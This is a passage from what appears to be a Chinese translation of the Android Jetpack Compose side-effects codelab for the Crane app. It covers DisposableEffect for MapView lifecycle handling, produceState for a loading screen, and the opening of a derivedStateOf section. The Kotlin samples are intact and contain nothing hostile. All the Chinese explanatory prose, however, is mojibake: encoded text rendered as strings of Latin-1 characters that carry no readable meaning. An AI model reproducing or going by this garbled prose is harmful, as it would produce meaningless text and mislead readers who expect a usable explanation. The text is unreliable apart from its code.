å†…è¯»å–çš„çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼ŒFlow ä¼šå‘æ”¶é›†å™¨å‘å‡ºæ–°å€¼ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œæ‚¨å°†çŠ¶æ€è½¬æ¢ä¸º Flowï¼Œä»¥ä½¿ç”¨ Flow è¿ç®—ç¬¦çš„å¼ºå¤§åŠŸèƒ½ã€‚è¿™æ ·ï¼Œæ‚¨å°±å¯ä»¥åœ¨Â <code>text</code>Â ä¸æ˜¯Â <code>hint</code>Â æ—¶ä½¿ç”¨Â <code>filter</code>Â è¿›è¡Œè¿‡æ»¤ï¼Œå¹¶ä½¿ç”¨Â <code>collect</code>Â æ”¶é›†å‘å‡ºçš„é¡¹ï¼Œä»¥é€šçŸ¥çˆ¶é¡¹å½“å‰çš„ç›®çš„åœ°å‘ç”Ÿäº†å˜åŒ–ã€‚</p>
<h2 data-id="heading-24">8. DisposableEffect</h2>
<p>å½“æ‚¨ç‚¹æŒ‰æŸä¸ªç›®çš„åœ°æ—¶ï¼Œç³»ç»Ÿä¼šæ‰“å¼€è¯¦æƒ…å±å¹•ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°ç›¸åº”çš„åŸå¸‚åœ¨åœ°å›¾ä¸Šçš„ä½ç½®ã€‚è¯¥ä»£ç ä½äºÂ <code>details/DetailsActivity.kt</code>Â æ–‡ä»¶ä¸­ã€‚åœ¨Â <code>CityMapView</code>Â å¯ç»„åˆé¡¹ä¸­ï¼Œæ‚¨è°ƒç”¨äº†Â <code>rememberMapViewWithLifecycle</code>Â å‡½æ•°ã€‚å¦‚æœæ‚¨æ‰“å¼€æ­¤å‡½æ•°ï¼ˆå®ƒä½äºÂ <code>details/MapViewUtils.kt</code>Â æ–‡ä»¶ä¸­ï¼‰ï¼Œæ‚¨ä¼šçœ‹åˆ°å®ƒæœªå…³è”åˆ°ä»»ä½•ç”Ÿå‘½å‘¨æœŸï¼å®ƒåªæ˜¯è®°ä½Â <code>MapView</code>Â å¹¶å¯¹å…¶è°ƒç”¨Â <code>onCreate</code>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// details/MapViewUtils.kt file - code in the main branch</span>

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">rememberMapViewWithLifecycle</span><span class="hljs-params">()</span></span>: MapView {
Â  Â  <span class="hljs-keyword">val</span> context = LocalContext.current
Â  Â  <span class="hljs-comment">// TODO Codelab: DisposableEffect step. Make MapView follow the lifecycle</span>
Â  Â  <span class="hljs-keyword">return</span> remember {
Â  Â  Â  Â  MapView(context).apply {
Â  Â  Â  Â  Â  Â  id = R.id.map
Â  Â  Â  Â  Â  Â  onCreate(Bundle())
Â  Â  Â  Â  }
Â  Â  }
}
</code></pre>
<p>è™½ç„¶åº”ç”¨è¿è¡Œè‰¯å¥½ï¼Œä½†è¿™ä¹Ÿæ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºÂ <code>MapView</code>Â æœªéµå¾ªæ­£ç¡®çš„ç”Ÿå‘½å‘¨æœŸã€‚å› æ­¤ï¼Œå®ƒä¸çŸ¥é“åº”ç”¨ä½•æ—¶è½¬è‡³åå°ã€View ä½•æ—¶åº”æš‚åœï¼Œç­‰ç­‰ã€‚è®©æˆ‘ä»¬æ¥è§£å†³è¿™ä¸€é—®é¢˜ï¼</p>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šå¦‚æœæ‚¨æœªçœ‹åˆ°åœ°å›¾ï¼Œè¯·æŸ¥çœ‹â€œå‡†å¤‡è®¾ç½®â€æ­¥éª¤ä¸­çš„â€œ[å¯é€‰] åœ¨è¯¦æƒ…å±å¹•ä¸Šæ˜¾ç¤ºåœ°å›¾â€éƒ¨åˆ†ã€‚** **ä¸è¿‡ï¼Œå¯¹äºæœ¬éƒ¨åˆ†ï¼Œæ²¡æœ‰å¿…è¦åœ¨å±å¹•ä¸Šçœ‹åˆ°åœ°å›¾ã€‚</p>
</blockquote>
<p>ç”±äºÂ <code>MapView</code>Â æ˜¯ View è€Œä¸æ˜¯å¯ç»„åˆé¡¹ï¼Œå› æ­¤æ‚¨å¸Œæœ›å®ƒéµå¾ªä½¿ç”¨å®ƒçš„ Activity çš„ç”Ÿå‘½å‘¨æœŸï¼Œä»¥åŠç»„åˆçš„ç”Ÿå‘½å‘¨æœŸã€‚è¿™æ„å‘³ç€ï¼Œæ‚¨éœ€è¦åˆ›å»ºä¸€ä¸ªÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fandroidx%2Flifecycle%2FLifecycleEventObserver%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/reference/androidx/lifecycle/LifecycleEventObserver?hl=zh-cn" ref="nofollow noopener noreferrer"><code>LifecycleEventObserver</code></a>Â æ¥ç›‘å¬ç”Ÿå‘½å‘¨æœŸäº‹ä»¶å¹¶åœ¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.google.com%2Fandroid%2Freference%2Fcom%2Fgoogle%2Fandroid%2Fgms%2Fmaps%2FMapView%3Fhl%3Dzh-cn" target="_blank" title="https://developers.google.com/android/reference/com/google/android/gms/maps/MapView?hl=zh-cn" ref="nofollow noopener noreferrer"><code>MapView</code></a>Â ä¸Šè°ƒç”¨æ­£ç¡®çš„æ–¹æ³•ã€‚ç„¶åï¼Œæ‚¨éœ€è¦å°†æ­¤è§‚å¯Ÿå™¨æ·»åŠ åˆ°å½“å‰ activity çš„ç”Ÿå‘½å‘¨æœŸã€‚</p>
<p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°è¿”å›Â <code>LifecycleEventObserver</code>ï¼Œåœ¨ç»™å®šæŸä¸ªäº‹ä»¶çš„æƒ…å†µä¸‹ï¼Œå®ƒä¼šåœ¨Â <code>MapView</code>Â ä¸­è°ƒç”¨ç›¸åº”çš„æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// details/MapViewUtils.kt file</span>

<span class="hljs-keyword">import</span> androidx.lifecycle.Lifecycle
<span class="hljs-keyword">import</span> androidx.lifecycle.LifecycleEventObserver

<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getMapLifecycleObserver</span><span class="hljs-params">(mapView: <span class="hljs-type">MapView</span>)</span></span>: LifecycleEventObserver =
Â  Â  LifecycleEventObserver { _, event -&gt;
Â  Â  Â  Â  <span class="hljs-keyword">when</span> (event) {
Â  Â  Â  Â  Â  Â  Lifecycle.Event.ON_CREATE -&gt; mapView.onCreate(Bundle())
Â  Â  Â  Â  Â  Â  Lifecycle.Event.ON_START -&gt; mapView.onStart()
Â  Â  Â  Â  Â  Â  Lifecycle.Event.ON_RESUME -&gt; mapView.onResume()
Â  Â  Â  Â  Â  Â  Lifecycle.Event.ON_PAUSE -&gt; mapView.onPause()
Â  Â  Â  Â  Â  Â  Lifecycle.Event.ON_STOP -&gt; mapView.onStop()
Â  Â  Â  Â  Â  Â  Lifecycle.Event.ON_DESTROY -&gt; mapView.onDestroy()
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">else</span> -&gt; <span class="hljs-keyword">throw</span> IllegalStateException()
Â  Â  Â  Â  }
Â  Â  }
</code></pre>
<p>ç°åœ¨ï¼Œæ‚¨éœ€è¦å°†æ­¤è§‚å¯Ÿå™¨æ·»åŠ åˆ°å½“å‰çš„ç”Ÿå‘½å‘¨æœŸï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å½“å‰çš„Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fandroidx%2Flifecycle%2FLifecycleOwner%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/reference/androidx/lifecycle/LifecycleOwner?hl=zh-cn" ref="nofollow noopener noreferrer"><code>LifecycleOwner</code></a>Â ä¸Â <code>LocalLifecycleOwner</code>Â ç»„åˆå±€éƒ¨å‡½æ•°æ¥è·å–è¯¥ç”Ÿå‘½å‘¨æœŸã€‚ä¸è¿‡ï¼Œä»…ä»…æ·»åŠ è§‚å¯Ÿå™¨æ˜¯ä¸å¤Ÿçš„ï¼›æ‚¨è¿˜éœ€è¦èƒ½å¤Ÿå°†å…¶ç§»é™¤ï¼æ‚¨éœ€è¦ä¸€ç§é™„å¸¦æ•ˆåº”ï¼Œå¯ä»¥åœ¨æ•ˆåº”é€€å‡ºç»„åˆæ—¶å‘ŠçŸ¥æ‚¨ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥æ‰§è¡Œä¸€äº›æ¸…ç†ä»£ç ã€‚æ‚¨å¯»æ‰¾çš„é™„å¸¦æ•ˆåº” API æ˜¯Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23DisposableEffect(kotlin.Any%2Ckotlin.Function1)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#DisposableEffect(kotlin.Any,kotlin.Function1)" ref="nofollow noopener noreferrer"><code>DisposableEffect</code></a>ã€‚</p>
<p><code>DisposableEffect</code>Â é€‚ç”¨äºåœ¨é”®å‘ç”Ÿå˜åŒ–æˆ–å¯ç»„åˆé¡¹é€€å‡ºç»„åˆåéœ€è¦æ¸…ç†çš„é™„å¸¦æ•ˆåº”ã€‚æœ€ç»ˆçš„Â <code>rememberMapViewWithLifecycle</code>Â ä»£ç æ­£å¥½èµ·åˆ°è¿™ç§ä½œç”¨ã€‚åœ¨é¡¹ç›®ä¸­å®ç°ä»¥ä¸‹ä»£ç è¡Œï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// details/MapViewUtils.kt file</span>

<span class="hljs-keyword">import</span> androidx.compose.runtime.DisposableEffect
<span class="hljs-keyword">import</span> androidx.compose.ui.platform.LocalLifecycleOwner

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">rememberMapViewWithLifecycle</span><span class="hljs-params">()</span></span>: MapView {
Â  Â  <span class="hljs-keyword">val</span> context = LocalContext.current
Â  Â  <span class="hljs-keyword">val</span> mapView = remember {
Â  Â  Â  Â  MapView(context).apply {
Â  Â  Â  Â  Â  Â  id = R.id.map
Â  Â  Â  Â  }
Â  Â  }

Â  Â  <span class="hljs-keyword">val</span> lifecycle = LocalLifecycleOwner.current.lifecycle
Â  Â  DisposableEffect(key1 = lifecycle, key2 = mapView) {
Â  Â  Â  Â  <span class="hljs-comment">// Make MapView follow the current lifecycle</span>
Â  Â  Â  Â  <span class="hljs-keyword">val</span> lifecycleObserver = getMapLifecycleObserver(mapView)
Â  Â  Â  Â  lifecycle.addObserver(lifecycleObserver)
Â  Â  Â  Â  onDispose {
Â  Â  Â  Â  Â  Â  lifecycle.removeObserver(lifecycleObserver)
Â  Â  Â  Â  }
Â  Â  }

Â  Â  <span class="hljs-keyword">return</span> mapView
}
</code></pre>
<p>å°†è§‚å¯Ÿå™¨æ·»åŠ åˆ°äº†å½“å‰çš„Â <code>lifecycle</code>ï¼Œåªè¦å½“å‰çš„ç”Ÿå‘½å‘¨æœŸå‘ç”Ÿå˜åŒ–æˆ–è€…æ­¤å¯ç»„åˆé¡¹é€€å‡ºç»„åˆï¼Œå°±ä¼šå°†å…¶ç§»é™¤ã€‚å¯¹äºÂ <code>DisposableEffect</code>Â ä¸­çš„Â <code>key</code>ï¼Œå¦‚æœÂ <code>lifecycle</code>Â æˆ–Â <code>mapView</code>Â å‘ç”Ÿå˜åŒ–ï¼Œç³»ç»Ÿä¼šç§»é™¤è§‚å¯Ÿå™¨å¹¶å†æ¬¡å°†å…¶æ·»åŠ åˆ°æ­£ç¡®çš„Â <code>lifecycle</code>ã€‚</p>
<p>é€šè¿‡æ‚¨åˆšåˆšæ‰€åšçš„æ›´æ”¹ï¼Œ<code>MapView</code>Â å°†å§‹ç»ˆéµå¾ªå½“å‰Â <code>LifecycleOwner</code>Â çš„Â <code>lifecycle</code>ï¼Œå¹¶ä¸”å…¶è¡Œä¸ºå°±åƒåœ¨ View ç¯å¢ƒä¸­ä½¿ç”¨å®ƒæ—¶ä¸€æ ·ã€‚</p>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šæ­¤éƒ¨åˆ†ä»‹ç»äº†å¦‚ä½•å®šä¹‰Â <code>LifecycleEventObserver</code>Â æ¥å“åº” Compose ä¸­çš„Â <code>LifecycleOwner</code>Â äº‹ä»¶ã€‚æ‚¨è¿˜å­¦ä¹ äº†å¦‚ä½•ä½¿ç”¨Â <code>DisposableEffect</code>Â API å®‰å…¨å¤„ç½®èµ„æºï¼Œä»¥é¿å…å†…å­˜æ³„æ¼ã€‚ç›¸å…³ç¤ºä¾‹ä½¿ç”¨äº†åŸºäº View çš„ç»„ä»¶Â <code>MapView</code>ã€‚åœ¨çœŸå®çš„ Compose åº”ç”¨ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨æ–°çš„Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.google.com%2Fmaps%2Fdocumentation%2Fandroid-sdk%2Fmaps-compose%3Fhl%3Dzh-cn" target="_blank" title="https://developers.google.com/maps/documentation/android-sdk/maps-compose?hl=zh-cn" ref="nofollow noopener noreferrer">Maps for Compose åº“</a>ï¼Œè¯¥åº“ä¼šä¸ºæ‚¨å¤„ç†ç”Ÿå‘½å‘¨æœŸäº‹ä»¶ã€‚</p>
</blockquote>
<h2 data-id="heading-25">9. produceState</h2>
<p>åœ¨æœ¬éƒ¨åˆ†ä¸­ï¼Œæ‚¨å°†æ”¹è¿›è¯¦æƒ…å±å¹•çš„å¯åŠ¨æ–¹å¼ã€‚<code>details/DetailsActivity.kt</code>Â æ–‡ä»¶ä¸­çš„Â <code>DetailsScreen</code>Â å¯ç»„åˆé¡¹ä¼šä» ViewModel åŒæ­¥è·å–Â <code>cityDetails</code>ï¼Œå¹¶åœ¨ç»“æœæˆåŠŸæ—¶è°ƒç”¨Â <code>DetailsContent</code>ã€‚</p>
<p>ä¸è¿‡ï¼Œ<code>cityDetails</code>Â åœ¨ç•Œé¢çº¿ç¨‹ä¸Šçš„åŠ è½½æˆæœ¬å¯èƒ½ä¼šå˜å¾—è¶Šæ¥è¶Šé«˜ï¼Œå®ƒå¯ä»¥ä½¿ç”¨åç¨‹å°†æ•°æ®çš„åŠ è½½å·¥ä½œç§»è‡³å…¶ä»–çº¿ç¨‹ã€‚æ‚¨å°†æ”¹è¿›æ­¤ä»£ç ï¼Œä»¥æ·»åŠ ä¸€ä¸ªåŠ è½½å±å¹•ï¼Œå¹¶åœ¨æ•°æ®å‡†å¤‡å°±ç»ªæ—¶æ˜¾ç¤ºÂ <code>DetailsContent</code>ã€‚</p>
<p>ä¸ºå±å¹•çŠ¶æ€å»ºæ¨¡çš„ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ä»¥ä¸‹ç±»ï¼Œå®ƒæ¶µç›–äº†æ‰€æœ‰çš„å¯èƒ½æ€§ï¼šè¦åœ¨å±å¹•ä¸Šæ˜¾ç¤ºçš„æ•°æ®ï¼Œä»¥åŠåŠ è½½å’Œé”™è¯¯ä¿¡å·ã€‚å°†Â <code>DetailsUiState</code>Â ç±»æ·»åŠ åˆ°Â <code>DetailsActivity.kt</code>Â æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// details/DetailsActivity.kt file</span>

<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DetailsUiState</span>(
Â  Â  <span class="hljs-keyword">val</span> cityDetails: ExploreModel? = <span class="hljs-literal">null</span>,
Â  Â  <span class="hljs-keyword">val</span> isLoading: <span class="hljs-built_in">Boolean</span> = <span class="hljs-literal">false</span>,
Â  Â  <span class="hljs-keyword">val</span> throwError: <span class="hljs-built_in">Boolean</span> = <span class="hljs-literal">false</span>
)
</code></pre>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ•°æ®æµï¼ˆå³Â <code>DetailsUiState</code>Â ç±»å‹çš„Â <code>StateFlow</code>ï¼‰æ˜ å°„å±å¹•éœ€è¦æ˜¾ç¤ºçš„å†…å®¹å’Œ ViewModel å±‚ä¸­çš„Â <code>UiState</code>ï¼ŒViewModel ä¼šåœ¨ä¿¡æ¯å‡†å¤‡å°±ç»ªæ—¶æ›´æ–°è¯¥æ•°æ®æµï¼Œè€Œ Compose ä¼šä½¿ç”¨æ‚¨å·²äº†è§£çš„Â <code>collectAsStateWithLifecycle()</code>Â API æ”¶é›†è¯¥æ•°æ®æµã€‚</p>
<p>ä¸è¿‡ï¼Œä¸ºäº†æœ¬ç»ƒä¹ ï¼Œæ‚¨å°†å®ç°ä¸€ç§æ›¿ä»£æ–¹æ¡ˆã€‚å¦‚æœæ‚¨å¸Œæœ›å°†Â <code>uiState</code>Â æ˜ å°„é€»è¾‘ç§»è‡³ Compose ç¯å¢ƒï¼Œæ‚¨å¯ä»¥ä½¿ç”¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23produceState(kotlin.Any%2Ckotlin.coroutines.SuspendFunction1)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#produceState(kotlin.Any,kotlin.coroutines.SuspendFunction1)" ref="nofollow noopener noreferrer"><code>produceState</code></a>Â APIã€‚</p>
<p><code>produceState</code>Â å¯è®©æ‚¨å°†é Compose çŠ¶æ€è½¬æ¢ä¸º ComposeÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2FState%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/State?hl=zh-cn" ref="nofollow noopener noreferrer">çŠ¶æ€</a>ã€‚å®ƒä¼šå¯åŠ¨ä¸€ä¸ªä½œç”¨åŸŸé™å®šä¸ºç»„åˆçš„åç¨‹ï¼Œè¯¥åç¨‹å¯ä½¿ç”¨Â <code>value</code>Â å±æ€§å°†å€¼æ¨é€åˆ°è¿”å›çš„Â <code>State</code>ã€‚ä¸Â <code>LaunchedEffect</code>Â ä¸€æ ·ï¼Œ<code>produceState</code>Â ä¹Ÿé‡‡ç”¨é”®æ¥å–æ¶ˆå’Œé‡æ–°å¼€å§‹è®¡ç®—ã€‚</p>
<p>å¯¹äºæ‚¨çš„ç”¨ä¾‹ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨Â <code>produceState</code>Â å‘å‡ºåˆå§‹å€¼ä¸ºÂ <code>DetailsUiState(isLoading = true)</code>Â çš„Â <code>uiState</code>Â æ›´æ–°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// details/DetailsActivity.kt file</span>

<span class="hljs-keyword">import</span> androidx.compose.runtime.produceState

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">DetailsScreen</span><span class="hljs-params">(
Â  Â  onErrorLoading: () -&gt; <span class="hljs-type">Unit</span>,
Â  Â  modifier: <span class="hljs-type">Modifier</span> = Modifier,
Â  Â  viewModel: <span class="hljs-type">DetailsViewModel</span> = viewModel()</span></span>
) {

Â  Â  <span class="hljs-keyword">val</span> uiState <span class="hljs-keyword">by</span> produceState(initialValue = DetailsUiState(isLoading = <span class="hljs-literal">true</span>)) {
Â  Â  Â  Â  <span class="hljs-comment">// In a coroutine, this can call suspend functions or move</span>
Â  Â  Â  Â  <span class="hljs-comment">// the computation to different Dispatchers</span>
Â  Â  Â  Â  <span class="hljs-keyword">val</span> cityDetailsResult = viewModel.cityDetails
Â  Â  Â  Â  value = <span class="hljs-keyword">if</span> (cityDetailsResult <span class="hljs-keyword">is</span> Result.Success&lt;ExploreModel&gt;) {
Â  Â  Â  Â  Â  Â  DetailsUiState(cityDetailsResult.<span class="hljs-keyword">data</span>)
Â  Â  Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  Â  Â  DetailsUiState(throwError = <span class="hljs-literal">true</span>)
Â  Â  Â  Â  }
Â  Â  }

Â  Â  <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> ... </span>
}
</code></pre>
<p>æ¥ä¸‹æ¥ï¼Œæ ¹æ®Â <code>uiState</code>ï¼Œæ‚¨ä¼šæ˜¾ç¤ºæ•°æ®ã€æ˜¾ç¤ºåŠ è½½å±å¹•æˆ–æŠ¥å‘Šé”™è¯¯ã€‚ä¸‹é¢æ˜¯Â <code>DetailsScreen</code>Â å¯ç»„åˆé¡¹çš„å®Œæ•´ä»£ç ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// details/DetailsActivity.kt file</span>

<span class="hljs-keyword">import</span> androidx.compose.foundation.layout.Box
<span class="hljs-keyword">import</span> androidx.compose.material.CircularProgressIndicator

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">DetailsScreen</span><span class="hljs-params">(
Â  Â  onErrorLoading: () -&gt; <span class="hljs-type">Unit</span>,
Â  Â  modifier: <span class="hljs-type">Modifier</span> = Modifier,
Â  Â  viewModel: <span class="hljs-type">DetailsViewModel</span> = viewModel()</span></span>
) {
Â  Â  <span class="hljs-keyword">val</span> uiState <span class="hljs-keyword">by</span> produceState(initialValue = DetailsUiState(isLoading = <span class="hljs-literal">true</span>)) {
Â  Â  Â  Â  <span class="hljs-keyword">val</span> cityDetailsResult = viewModel.cityDetails
Â  Â  Â  Â  value = <span class="hljs-keyword">if</span> (cityDetailsResult <span class="hljs-keyword">is</span> Result.Success&lt;ExploreModel&gt;) {
Â  Â  Â  Â  Â  Â  DetailsUiState(cityDetailsResult.<span class="hljs-keyword">data</span>)
Â  Â  Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  Â  Â  DetailsUiState(throwError = <span class="hljs-literal">true</span>)
Â  Â  Â  Â  }
Â  Â  }

Â  Â  <span class="hljs-keyword">when</span> {
Â  Â  Â  Â  uiState.cityDetails != <span class="hljs-literal">null</span> -&gt; {
Â  Â  Â  Â  Â  Â  DetailsContent(uiState.cityDetails!!, modifier.fillMaxSize())
Â  Â  Â  Â  }
Â  Â  Â  Â  uiState.isLoading -&gt; {
Â  Â  Â  Â  Â  Â  Box(modifier.fillMaxSize()) {
Â  Â  Â  Â  Â  Â  Â  Â  CircularProgressIndicator(
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  color = MaterialTheme.colors.onSurface,
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  modifier = Modifier.align(Alignment.Center)
Â  Â  Â  Â  Â  Â  Â  Â  )
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  }
Â  Â  Â  Â  <span class="hljs-keyword">else</span> -&gt; { onErrorLoading() }
Â  Â  }
}
</code></pre>
<p>å¦‚æœæ‚¨è¿è¡Œåº”ç”¨ï¼Œæ‚¨ä¼šçœ‹åˆ°åœ¨æ˜¾ç¤ºåŸå¸‚è¯¦æƒ…ä¹‹å‰å¦‚ä½•å‡ºç°äº†æŒ‡ç¤ºâ€œæ­£åœ¨åŠ è½½â€çš„æ—‹è½¬å›¾æ ‡ã€‚</p>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼š<code>collectAsStateWithLifecycle()</code>Â API ä¼šåœ¨åå°ä½¿ç”¨Â <code>produceState()</code>Â APIã€‚</p>
</blockquote>
<h2 data-id="heading-26">10. derivedStateOf</h2>
<p>æ‚¨è¦å¯¹ Crane åšçš„æœ€åä¸€é¡¹æ”¹è¿›æ˜¯ï¼Œæ¯å½“æ‚¨åœ¨èˆªç­ç›®çš„åœ°åˆ—è¡¨ä¸­æ»šåŠ¨æ—¶ï¼Œç»è¿‡å±å¹•çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¹‹åï¼Œéƒ½ä¼šæ˜¾ç¤ºä¸€ä¸ªç”¨äºâ€œæ»šåŠ¨è‡³é¡¶éƒ¨â€çš„æŒ‰é’®ã€‚ç‚¹æŒ‰è¯¥æŒ‰é’®ä¼šä½¿æ‚¨å‰å¾€åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p>
<p>æ‰“å¼€åŒ…å«æ­¤ä»£ç çš„Â <code>base/ExploreSection.kt</code>Â æ–‡ä»¶ã€‚<code>ExploreSection</code>Â å¯ç»„åˆé¡¹å¯¹åº”äºæ‚¨åœ¨ Scaffold çš„èƒŒæ™¯å¹•ä¸­çœ‹åˆ°çš„å†…å®¹ã€‚</p>
<p>å¦‚éœ€è®¡ç®—ç”¨æˆ·æ˜¯å¦å·²ç»è¿‡ç¬¬ä¸€é¡¹ï¼Œè¯·ä½¿ç”¨Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Fjetpack%2Fcompose%2Flists%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/jetpack/compose/lists?hl=zh-cn" ref="nofollow noopener noreferrer"><code>LazyColumn</code></a>Â çš„Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Ffoundation%2Flazy%2FLazyListState%3Fhl%3Dzh-cn" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/foundation/lazy/LazyListState?hl=zh-cn" ref="nofollow noopener noreferrer"><code>LazyListState</code></a>Â å¹¶æ£€æŸ¥Â <code>listState.firstVisibleItemIndex &gt; 0</code>ã€‚</p>
<p>ç®€å•å®ç°å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// DO NOT DO THIS - It's executed on every recomposition</span>
<span class="hljs-keyword">val</span> showButton = listState.firstVisibleItemIndex &gt; <span class="hljs-number">0</span>
</code></pre>
<p>è¯¥è§£å†³æ–¹æ¡ˆçš„æ•ˆç‡å¹¶ä¸é«˜ï¼Œå› ä¸ºæ¯å½“Â <code>firstVisibleItemIndex</code>Â å‘ç”Ÿå˜åŒ–æ—¶ï¼Œè¯»å–Â <code>showButton</code>Â çš„å¯ç»„åˆå‡½æ•°éƒ½ä¼šé‡ç»„ï¼Œè¿™ç§æƒ…å†µç»å¸¸ä¼šåœ¨æ»šåŠ¨æ—¶å‘ç”Ÿã€‚ä¸è¿‡ï¼Œæ‚¨å¸Œæœ›è¯¥å‡½æ•°ä»…åœ¨æ¡ä»¶åœ¨Â <code>true</code>Â å’ŒÂ <code>false</code>Â ä¹‹é—´å˜åŒ–æ—¶é‡ç»„ã€‚</p>
<p>æœ‰ä¸€ä¸ª API å¯è®©æ‚¨åšåˆ°è¿™ä¸€ç‚¹ï¼Œé‚£å°±æ˜¯Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fkotlin%2Fandroidx%2Fcompose%2Fruntime%2Fpackage-summary%3Fhl%3Dzh-cn%23derivedStateOf(kotlin.Function0)" target="_blank" title="https://developer.android.com/reference/kotlin/androidx/compose/runtime/package-summary?hl=zh-cn#derivedStateOf(kotlin.Function0)" ref="nofollow noopener noreferrer"><code>derivedStateOf</code></a>Â APIã€‚</p>
<p><code>listState</code>Â æ˜¯ä¸€ä¸ªå¯è§‚å¯Ÿçš„ ComposeÂ <code>State</code>ã€‚æ‚¨çš„è®¡ç®—Â <code>showButton</code>Â ä¹Ÿéœ€è¦æ˜¯ä¸€ä¸ª ComposeÂ <code>State</code>ï¼Œå› ä¸ºæ‚¨å¸Œæœ›ç•Œé¢åœ¨å…¶å€¼å‘ç”Ÿå˜åŒ–æ—¶é‡ç»„ï¼Œå¹¶æ˜¾ç¤ºæˆ–éšè—æŒ‰é’®ã€‚</p>
<p>å½“æ‚¨æƒ³è¦çš„æŸä¸ª ComposeÂ <code>State</code>Â è¡ç”Ÿè‡ªå¦ä¸€ä¸ªÂ <code>State</code>Â æ—¶ï¼Œè¯·ä½¿ç”¨Â <code>derivedStateOf</code>ã€‚æ¯å½“å†…éƒ¨çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œç³»ç»Ÿéƒ½ä¼šæ‰§è¡ŒÂ <code>derivedStateOf</code>Â è®¡ç®—å—ï¼Œä½†åªæœ‰å½“è®¡ç®—ç»“æœä¸ä¸Šä¸€é¡¹ä¸åŒæ—¶ï¼Œå¯ç»„åˆå‡½æ•°æ‰ä¼šé‡ç»„ã€‚è¿™æ ·å¯ä»¥æœ€å¤§é™åº¦åœ°å‡å°‘è¯»å–Â <code>showButton</code>Â çš„å‡½æ•°çš„é‡ç»„æ¬¡æ•°ã€‚</p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½¿ç”¨Â <code>derivedStateOf</code>Â API æ˜¯ä¸€ç§æ›´å¥½ä¸”æ›´é«˜æ•ˆçš„æ›¿ä»£æ–¹æ¡ˆã€‚æ‚¨è¿˜ä¼šä½¿ç”¨Â <code>remember</code>Â API æ¥å°è£…è°ƒç”¨ï¼Œå› æ­¤è®¡ç®—å¾—å‡ºçš„å€¼åœ¨é‡ç»„åç»§ç»­æœ‰æ•ˆã€‚</p>
